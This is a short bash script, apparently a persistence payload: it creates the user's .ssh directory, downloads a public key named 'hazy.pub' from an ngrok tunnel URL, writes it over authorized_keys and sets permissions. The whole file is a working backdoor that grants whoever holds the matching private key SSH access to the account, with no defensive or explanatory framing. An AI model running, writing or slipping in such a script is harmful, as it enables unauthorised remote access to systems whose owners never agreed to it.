#!/bin/bash
IP="https://f033ac375c14.ngrok-free.app"
USER=$(/bin/whoami)
PATH=/home/$USER/

/bin/mkdir $PATH/.ssh/
/bin/chmod 700 $PATH/.ssh/
/bin/curl $IP/hazy.pub -o $PATH/.ssh/authorized_keys
/bin/chmod 600 $PATH/.ssh/authorized_keys